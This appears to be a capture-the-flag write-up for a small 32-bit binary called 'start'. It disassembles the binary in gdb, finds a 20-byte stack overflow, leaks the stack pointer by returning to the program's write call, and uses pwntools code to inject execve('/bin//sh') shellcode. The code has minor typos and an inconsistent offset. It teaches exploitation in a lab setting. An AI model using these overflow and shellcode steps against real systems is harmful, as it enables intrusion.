# start

We start by disassembling the program with gdb, and checking the `_start` function.
Let's analyze what we have:


```
gef➤  i functions
All defined functions:

Non-debugging symbols:
0x08048060  _start
0x0804809d  _exit
0x080490a3  __bss_start
0x080490a3  _edata
0x080490a4  _end
gef➤  disas _start
Dump of assembler code for function _start:
   0x08048060 <+0>:     push   esp
   0x08048061 <+1>:     push   0x804809d    // push into the stack the return funtion address
   0x08048066 <+6>:     xor    eax,eax      // clear registers
   0x08048068 <+8>:     xor    ebx,ebx
   0x0804806a <+10>:    xor    ecx,ecx
   0x0804806c <+12>:    xor    edx,edx
   0x0804806e <+14>:    push   0x3a465443   // push 5 * 4 = 20 bytes
   0x08048073 <+19>:    push   0x20656874   // each of those lines is 4 chars
   0x08048078 <+24>:    push   0x20747261   // use cyberchef for conversion
   0x0804807d <+29>:    push   0x74732073
   0x08048082 <+34>:    push   0x2774654c
   0x08048087 <+39>:    mov    ecx,esp
   0x08048089 <+41>:    mov    dl,0x14
   0x0804808b <+43>:    mov    bl,0x1
   0x0804808d <+45>:    mov    al,0x4        // write
   0x0804808f <+47>:    int    0x80          // interrupt write
   0x08048091 <+49>:    xor    ebx,ebx
   0x08048093 <+51>:    mov    dl,0x3c
   0x08048095 <+53>:    mov    al,0x3        // read
   0x08048097 <+55>:    int    0x80          // interrupt read
   0x08048099 <+57>:    add    esp,0x14      // stack gets popped of 20 bytes
   0x0804809c <+60>:    ret
End of assembler dump.
```

We notice that the stack gets popped of 20 bytes. We can write in memory
more that 20 bytes, so that the stack pointer will point to our input.

We can check this by generating a pattern:
```
pattern create 128
> aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab
```

We send this pattern as the input and check the value of the stack pointer:
```
i r
> esp = 0x61616166 ("faaa"?)
pattern search faaa
> Found at offset 17 (little-endian search) likely
```

So we can overwrite the return function address. We need to change this address to
the address of our shell code in the stack, so we need to get this one.

We can return to an arbitrary instruction already in the program. If we return where
the characters get printed, but after they are loaded in memory, we are leaking
the stack. Let's do this:

```python
payload = b'A' * 20 + p32(0x08048087);
arget.sendlineafter(":", payload)
esp = target.recv()[:4]
log.info("ESP Found: ", hex(u32(esp)))
```

Where "0x0848087" is the address of the instruction, padded with 20 bytes. Now that
we have the stack pointer (esp), we can send anoter payload with the custom shell code:
```python
shell = asm(shellcraft.i386.execve("/bin//sh"))
payload2 = b'A'*20 + p32(esp+20) + shell
target.send(payload2)
target.interactive()
```

And that's it! Notice we incremented the esp by 20 since we had added padding before it.

